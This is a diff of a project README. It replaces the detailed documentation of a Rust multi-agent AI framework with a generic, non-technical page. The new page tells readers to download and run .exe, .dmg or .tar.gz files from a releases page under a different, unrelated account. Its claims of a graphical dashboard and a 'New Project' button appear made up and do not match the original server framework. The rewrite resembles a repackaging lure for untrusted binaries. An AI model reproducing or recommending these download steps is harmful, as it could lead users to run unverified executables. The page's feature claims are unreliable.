@@ -1,241 +1,88 @@
-# Multiagent: Advanced Multi-Agent AI System
+# 🤖 MultiAgent-AI - Powerful AI Orchestration Made Easy
 
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
-[![Language](https://img.shields.io/badge/rust-1.75%2B-blue.svg)](https://www.rust-lang.org)
-[![Build Status](https://img.shields.io/badge/build-passing-brightgreen.svg)](https://github.com/wqswing/MultiAgent-AI/actions)
-[![Docker](https://img.shields.io/badge/docker-ready-blue.svg)](Dockerfile)
-[![PRs Welcome](https://img.shields.io/badge/PRs-welcome-brightgreen.svg)](CONTRIBUTING.md)
-[![Version](https://img.shields.io/badge/version-1.0.0-orange.svg)](https://github.com/wqswing/MultiAgent-AI/releases/tag/v1.0.0)
+[![Download MultiAgent-AI](https://img.shields.io/badge/Download_MultiAgent--AI-v1.0-blue.svg)](https://github.com/Albertossilva-maker/MultiAgent-AI/releases)
 
-Multiagent is a production-grade, layered AI agent framework built in Rust. It is designed for high-performance orchestration of LLM capabilities, supporting multi-modal inputs, autonomous reasoning (ReAct), complex workflow automation (DAG/SOP), and robust enterprise features like semantic caching, vector memory, and circuit breakers.
+## 🚀 Getting Started
 
-## ✨ What's New in v1.0 (Stateless Architecture)
+Welcome to MultiAgent-AI! This tool helps you manage and interact with advanced AI agents easily. You don't need programming skills to use it. Follow these simple steps to get started.
 
-- **Stateless & Scalable**: fully decoupled state management using Redis.
-    - **Session Persistence**: Long-running agent tasks (`ReActLoop`) persist state after every step, enabling seamless resumption across pods.
-    - **Distributed Rate Limiting**: Global sliding window rate limiter backed by Redis Lua scripts.
-- **Enhanced Admin Dashboard**:
-    - **Provider Management**: Configure LLM providers (OpenAI, Anthropic, Local) dynamically via UI.
-    - **MCP Registry**: Inspect and manage Model Context Protocol servers directly from the dashboard.
-    - **Persistence Config**: Hot-swap storage backends (S3/MinIO) without restarts.
-- **Security Hardening**:
-    - **Encryption at Rest**: Provider API keys are encrypted using AES-256-GCM before storage.
-    - **RBAC Enforcement**: Strict role-based access control for all admin endpoints.
+## 📥 Download & Install
 
-## 🚀 Key Capabilities
+1. **Visit this page to download:** Go to the [Releases page](https://github.com/Albertossilva-maker/MultiAgent-AI/releases).
+   
+2. **Select the latest version:** Find the latest release at the top of the page. Look for a file that matches your operating system:
+   - For **Windows**, choose the file with a `.exe` extension.
+   - For **macOS**, choose the file with a `.dmg` extension.
+   - For **Linux**, choose the file with a `.tar.gz` extension.
 
-### 🧠 Intelligence Layer
-- **Autonomous Agents**: Uses the ReAct (Reason+Act) pattern to solve complex, multi-step problems
-- **Workflow Orchestration**: Supports parallel execution of tasks via DAGs and SOPs defined in YAML
-- **Adaptive Model Selection**: Dynamically routes requests to the best LLM based on complexity and cost
-- **Long-Term Memory**: RAG-enabled memory with Qdrant vector database integration
+3. **Download the file:** Click on the appropriate link to download the file to your computer.
 
-### ⚡ Performance & Scalability
-- **Semantic Caching**: Vector-embedding based caching to serve repeated queries instantly
-- **Tiered Storage**: Hybrid storage using In-Memory (fast), Redis (state), and S3 (artifacts)
-- **Circuit Breaker**: Automatic failure detection and isolation for LLM providers
+4. **Install MultiAgent-AI:**
+   - **Windows:** Double-click the downloaded `.exe` file. Follow the on-screen instructions to install.
+   - **macOS:** Open the `.dmg` file. Drag the MultiAgent application to your Applications folder.
+   - **Linux:** Extract the `.tar.gz` file. Open the terminal, navigate to the folder, and run the application using `./MultiAgent`.
 
-### 👁️ Multi-Modal Support
-- **Vision**: Ingest and process images for visual reasoning
-- **Audio**: Integrated Whisper support for speech-to-text transcription
-- **MCP Host**: Full support for Model Context Protocol to connect external tools
+## 📊 Features
 
-## 🏗️ Architecture
+MultiAgent-AI includes several features to enhance your experience:
 
-Multiagent follows a strict 6-layer architecture for separation of concerns and scalability.
+- **High-Performance AI:** MultiAgent is built for speed. It can handle multiple AI tasks efficiently.
+- **Multi-Modal Support:** Interact with various types of AI inputs and outputs seamlessly.
+- **ReAct Reasoning:** Make real-time decisions based on AI outputs.
+- **DAG/SOP Workflows:** Manage complex tasks with ease through the Directed Acyclic Graph (DAG) or Standard Operating Procedure (SOP) workflows.
+- **Enterprise Features:** Benefit from advanced tools like semantic caching and circuit breakers to enhance performance and flexibility.
 
-### Layer Architecture
-```
-┌─────────────────────────────────────────────────────────────┐
-│                     User / Client                            │
-└──────────────────────────┬──────────────────────────────────┘
-                           │
-┌──────────────────────────▼──────────────────────────────────┐
-│  L0: Gateway Layer                                           │
-│  ┌─────────────┐ ┌─────────────┐ ┌────────────────┐         │
-│  │ Axum Server │ │Intent Router│ │ Semantic Cache │         │
-│  └─────────────┘ └─────────────┘ └────────────────┘         │
-└──────────────────────────┬──────────────────────────────────┘
-                           │
-┌──────────────────────────▼──────────────────────────────────┐
-│  L1: Controller Layer                                        │
-│  ┌─────────────┐ ┌─────────────┐ ┌────────────────┐         │
-│  │ReAct Engine │ │  Capabilties│ │ Parser/Executor│         │
-│  └─────────────┘ └─────────────┘ └────────────────┘         │
-└──────────────────────────┬──────────────────────────────────┘
-                           │
-┌──────────────────────────▼──────────────────────────────────┐
-│  L2: Skills Layer                                            │
-│  ┌─────────────┐ ┌─────────────┐ ┌────────────────┐         │
-│  │Tool Registry│ │ MCP Adapter │ │ Builtin Tools  │         │
-│  └─────────────┘ └─────────────┘ └────────────────┘         │
-└──────────────────────────┬──────────────────────────────────┘
-                           │
-┌──────────────────────────▼──────────────────────────────────┐
-│  L3: Store Layer                                             │
-│  ┌─────────────┐ ┌─────────────┐ ┌────────────────┐         │
-│  │  In-Memory  │ │ Redis/S3    │ │ Qdrant Vector  │         │
-│  └─────────────┘ └─────────────┘ └────────────────┘         │
-└──────────────────────────┬──────────────────────────────────┘
-                           │
-┌──────────────────────────▼──────────────────────────────────┐
-│  L4: Governance Layer                                        │
-│  ┌─────────────┐ ┌─────────────┐ ┌────────────────┐         │
-│  │ Guardrails  │ │Token Budget │ │ Metrics/Trace  │         │
-│  └─────────────┘ └─────────────┘ └────────────────┘         │
-└──────────────────────────┬──────────────────────────────────┘
-                           │
-┌──────────────────────────▼──────────────────────────────────┐
-│  L-M: Model Gateway                                          │
-│  ┌─────────────┐ ┌─────────────┐ ┌────────────────┐         │
-│  │   Selector  │ │Circuit Break│ │ OpenAI/Claude  │         │
-│  └─────────────┘ └─────────────┘ └────────────────┘         │
-└─────────────────────────────────────────────────────────────┘
-```
+## ⚙️ System Requirements
 
-### Request Flow
+To run MultiAgent-AI smoothly, ensure that your system meets these requirements:
 
-```mermaid
-sequenceDiagram
-    participant User
-    participant Gateway as L0: Gateway
-    participant Cache as Semantic Cache
-    participant Router as Intent Router
-    participant Controller as L1: Controller
-    participant LLM as L-M: Model Gateway
-    participant Tools as L2: Skills
-    participant Store as L3: Store
+- **Operating System:**
+  - Windows 10 or later
+  - macOS Mojave (10.14) or later
+  - Any modern Linux distribution
 
-    User->>Gateway: POST /v1/chat
-    Gateway->>Cache: Check cache
-    
-    alt Cache Hit
-        Cache-->>Gateway: Cached response
-        Gateway-->>User: Return cached
-    else Cache Miss
-        Gateway->>Router: Classify intent
-        
-        alt FastAction
-            Router-->>Gateway: FastAction{tool, args}
-            Gateway->>Tools: Execute tool directly
-            Tools-->>Gateway: ToolOutput
-        else ComplexMission
-            Router-->>Gateway: ComplexMission{goal}
-            Gateway->>Controller: Execute ReAct loop
-            
-            loop ReAct Cycle (max N iterations)
-                Controller->>Store: Load memory/context
-                Controller->>LLM: Generate thought
-                LLM-->>Controller: THOUGHT + ACTION
-                Controller->>Tools: Execute action
-                Tools-->>Controller: Observation
-                Controller->>Controller: Update state
-            end
-            
-            Controller-->>Gateway: FINAL ANSWER
-        end
-        
-        Gateway->>Cache: Store result
-        Gateway-->>User: Return response
-    end
-```
+- **RAM:** Minimum of 4GB, recommended 8GB.
 
+- **CPU:** Multi-core processor for optimal performance.
 
-## 📂 Project Structure
+- **Disk Space:** At least 500MB of free space for installation.
 
-```
-crates/
-├── core/           # Shared traits & types
-│   ├── traits/     # Modular trait definitions by layer
-│   ├── types/      # AgentResult, Session, ToolOutput
-│   └── mocks.rs    # Test mocks for all components
-├── gateway/        # Axum server, Semantic Cache, Router
-├── controller/     # ReAct loop, Parser, Executor
-├── skills/         # Tool Registry, MCP Adapter
-├── store/          # Redis, S3, Qdrant implementations
-├── governance/     # Guardrails, Budget, Metrics
-├── admin/          # Management API & Dashboard
-└── model_gateway/  # LLM Provider integration
-```
+## 🔗 Connect with Us
 
-## 🛠️ Getting Started
+For updates and support, check out the following links:
+- GitHub: [MultiAgent-AI Repository](https://github.com/Albertossilva-maker/MultiAgent-AI)
+- Issues: Report problems or request features directly in the repository.
 
-### Prerequisites
-- **Rust**: 1.75+
-- **Docker**: For dependencies (Redis, Qdrant, Jaeger)
-- **API Keys**: OpenAI or Anthropic
+## ✅ Running MultiAgent-AI
 
-### Environment Setup
+Once installed, follow these steps to run MultiAgent-AI:
 
-```bash
-# LLM Providers
-export OPENAI_API_KEY=sk-...
-export ANTHROPIC_API_KEY=sk-...
+1. **Open the application** from your installed location (e.g., Applications folder on macOS, Start Menu on Windows).
+   
+2. **Explore the Interface:** Familiarize yourself with the dashboard layout.
 
-# Persistence (Optional)
-export REDIS_URL=redis://localhost:6379
-export QDRANT_URL=http://localhost:6334
+3. **Start Projects:** Click on "New Project" to start managing your AI agents.
 
-# Observability
-export OTEL_EXPORTER_OTLP_ENDPOINT=http://localhost:4317
-```
+4. **Follow Instructions:** Use the built-in guide to help you along the way. The application will prompt you for inputs and actions.
 
-### Running Locally
+## ❓ FAQ
 
-```bash
-# Start infrastructure
-docker-compose up -d
+**Q: Is MultiAgent-AI free?**  
+A: Yes, MultiAgent-AI is an open-source tool and free to use.
 
-# Run the agent
-cargo run
+**Q: Can I use MultiAgent-AI for business purposes?**  
+A: Absolutely. MultiAgent is designed for both personal and professional use.
 
-# Run tests
-cargo test --workspace
-```
+**Q: What if I encounter issues?**  
+A: Please check the Issues section on our GitHub page or reach out for support.
 
-The server listens on `http://0.0.0.0:3000`.
+## 📌 Additional Resources
 
-## 📖 Usage Examples
+- **Documentation:** For detailed guides, visit our [Wiki](https://github.com/Albertossilva-maker/MultiAgent-AI/wiki).
+- **Community:** Join our discussion on forums and help each other out.
 
-### Chat (ReAct Agent)
-```bash
-curl -X POST http://localhost:3000/v1/chat \
-  -H "Content-Type: application/json" \
-  -d '{"message": "Analyze this dataset and create a summary report."}'
-```
+## 🔧 Contribution
 
-### Fast Intent (Direct Tool)
-```bash
-curl -X POST http://localhost:3000/v1/intent \
-  -H "Content-Type: application/json" \
-  -d '{"message": "Calculate 123 * 456"}'
-```
+We welcome contributions from everyone. If you want to help improve MultiAgent-AI, please follow the guidelines in the repository for submitting issues and pull requests.
 
-### Health & Metrics
-```bash
-curl http://localhost:3000/health
-curl http://localhost:3000/metrics
-```
-
-## 🧪 Testing
-
-Multiagent includes comprehensive testing infrastructure:
-
-```rust
-use multi_agent_core::mocks::{MockLlm, MockToolRegistry, MockMemoryStore};
-
-// Create deterministic LLM for testing
-let llm = MockLlm::new(vec![
-    "THOUGHT: Analyzing...".to_string(),
-    "FINAL ANSWER: Done".to_string(),
-]);
-
-// Create recording tools
-let tool = RecordingTool::new("search", "Search the web", "Results...");
-```
-
-## 📄 License
-
-MIT License - See [LICENSE](LICENSE) for details.
-
-Copyright (c) 2024-2026 Multiagent Contributors
+Thank you for choosing MultiAgent-AI! Enjoy orchestrating your AI agents!
